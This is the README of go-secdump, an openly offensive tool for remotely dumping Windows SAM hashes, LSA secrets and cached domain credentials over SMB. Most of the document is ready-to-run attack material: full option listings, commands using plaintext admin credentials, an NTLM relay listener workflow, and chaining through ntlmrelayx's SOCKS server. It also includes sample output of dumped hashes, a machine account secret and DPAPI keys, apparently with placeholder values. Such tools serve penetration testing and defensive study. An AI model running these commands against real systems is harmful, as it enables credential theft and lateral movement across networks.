# go-secdump

## Description
Package go-secdump is a tool built to remotely extract hashes from the SAM
registry hive as well as LSA secrets and cached hashes from the SECURITY hive
without any remote agent and without touching disk.

The tool is built on top of the library [go-smb](https://github.com/jfjallid/go-smb)
and use it to communicate with the Windows Remote Registry to retrieve registry
keys directly from memory.

It was built as a learning experience and as a proof of concept that it should
be possible to remotely retrieve the NT Hashes from the SAM hive and the LSA
secrets as well as domain cached credentials without having to first save the
registry hives to disk and then parse them locally.

The main problem to overcome was that the SAM and SECURITY hives are only
readable by NT AUTHORITY\SYSTEM. However, I noticed that the local group
administrators had the WriteDACL permission on the registry hives and could
thus be used to temporarily grant read access to itself to retrieve the
secrets and then restore the original permissions.

However, a better approach was discovered (February 2025) by Julien Egloff
over at Synacktiv. The BaseRegOpenKey request used to open handles to registry
keys has an option to assert the SeBackupPrivilege which allows us to open the
registry keys without first changing the DACLs.
The tool has been updated to prefer this new approach and only change the DACLs
if asked nicely.

## Credits
Much of the code in this project is inspired/taken from Impacket's secdump
but converted to access the Windows registry remotely and to only access the
required registry keys.

Some of the other sources that have been useful to understanding the registry
structure and encryption methods are listed below: 

https://www.passcape.com/index.php?section=docsys&cmd=details&id=23

http://www.beginningtoseethelight.org/ntsecurity/index.htm

https://social.technet.microsoft.com/Forums/en-US/6e3c4486-f3a1-4d4e-9f5c-bdacdb245cfd/how-are-ntlm-hashes-stored-under-the-v-key-in-the-sam?forum=win10itprogeneral

The idea to use SeBackupPrivilege came from Synacktiv:
https://www.synacktiv.com/publications/lsa-secrets-revisiting-secretsdump

## Usage
```
Usage: ./go-secdump [options]

options:
      --host <target>       Hostname or ip address of remote server. Must be hostname when using Kerberos
  -P, --port <port>         SMB Port (default 445)
  -d, --domain <domain>     Domain name to use for login
  -u, --user <username>     Username
  -p, --pass <pass>         Password
  -n, --no-pass             Disable password prompt and send no credentials
      --hash <NT Hash>      Hex encoded NT Hash for user password
      --local               Authenticate as a local user instead of domain user
  -k, --kerberos            Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
      --dc-ip               Optionally specify ip of KDC when using Kerberos authentication
      --target-ip           Optionally specify ip of target when using Kerberos authentication
      --aes-key             Use a hex encoded AES128/256 key for Kerberos authentication
      --dump                Saves the SAM and SECURITY hives to disk and
                            transfers them to the local machine.
      --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
      --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
      --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
      --modify-dacl         Change DACLs of reg keys before dump.
                            Only required if keys cannot be opened using SeBackupPrivilege. (default false)
      --backup-dacl         Save original DACLs to disk before modification
      --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
      --backup-file         Filename for DACL backup (default dacl.backup)
      --relay               Start an SMB listener that will relay incoming
                            NTLM authentications to the remote server and
                            use that connection. NOTE that this forces SMB 2.1
                            without encryption.
      --relay-port <port>   Listening port for relay (default 445)
      --socks-host <target> Establish connection via a SOCKS5 proxy server
      --socks-port <port>   SOCKS5 proxy port (default 1080)
  -t, --timeout             Dial timeout in seconds (default 5)
      --noenc               Disable smb encryption
      --smb2                Force smb 2.1
      --debug               Enable debug logging
      --verbose             Enable verbose logging
  -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
  -v, --version             Show version

```

## Changing DACLs
Now only as an optional feature enabled with `--modify-dacl`,
go-secdump will automatically try to modify and then restore the DACLs of the
required registry keys. However, if something goes wrong during the restoration
part such as a network disconnect or other interrupt, the remote registry will
be left with the modified DACLs.

Using the `--backup-dacl` argument it is possible to store a serialized copy of
the original DACLs before modification.
If a connectivity problem occurs, the DACLs can later be restored from file
using the `--restore-dacl` argument.

## Examples

Dump all registry secrets using the SeBackupPrivilege trick

```
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local
or
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
```

Dump only SAM, LSA, or DCC2 cache secrets

```
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa
./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2
```

### NTLM Relaying
Dump registry secrets using NTLM relaying

Start listener
```
./go-secdump --host 192.168.0.100 -n --relay
```

Trigger an auth to your machine from a client with administrative access to
192.168.0.100 somehow and then wait for the dumped secrets.

```
YYYY/MM/DD HH:MM:SS smb [Notice] Client connected from 192.168.0.30:49805
YYYY/MM/DD HH:MM:SS smb [Notice] Client (192.168.0.30:49805) successfully authenticated as (domain.local\Administrator) against (192.168.0.100:445)!
Net-NTLMv2 Hash: Administrator::domain.local:34f4533b697afc39:b4dcafebabedd12deadbeeffef1cea36:010100000deadbeef59d13adc22dda0
2023/12/13 14:47:28 [Notice] [+] Signing is NOT required
2023/12/13 14:47:28 [Notice] [+] Login successful as domain.local\Administrator
[*] Dumping local SAM hashes
Name: Administrator
RID: 500
NT: 2727D7906A776A77B34D0430EAACD2C5

Name: Guest
RID: 501
NT: <empty>

Name: DefaultAccount
RID: 503
NT: <empty>

Name: WDAGUtilityAccount
RID: 504
NT: <empty>

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: 0x15deadbeef645e75b38a50a52bdb67b4
$MACHINE.ACC:plain_password_hex:47331e26f48208a7807cafeababe267261f79fdc38c740b3bdeadbeef7277d696bcafebabea62bb5247ac63be764401adeadbeef4563cafebabe43692deadbeef03f...
[*] DPAPI_SYSTEM
dpapi_machinekey: 0x8afa12897d53deadbeefbd82593f6df04de9c100
dpapi_userkey: 0x706e1cdea9a8a58cafebabe4a34e23bc5efa8939
[*] NL$KM
NL$KM: 0x53aa4b3d0deadbeef42f01ef138c6a74
[*] Dumping cached domain credentials (domain/username:hash)
DOMAIN.LOCAL/Administrator:$DCC2$10240#Administrator#97070d085deadbeef22cafebabedd1ab
...
```

### SOCKS Proxy
Dump secrets using an upstream SOCKS5 proxy either for pivoting or to take
advantage of Impacket's ntlmrelayx.py SOCKS server functionality.

When using ntlmrelayx.py as the upstream proxy, the provided username must match
that of the authenticated client, but the password can be empty.

```
./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server
...

./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080
```
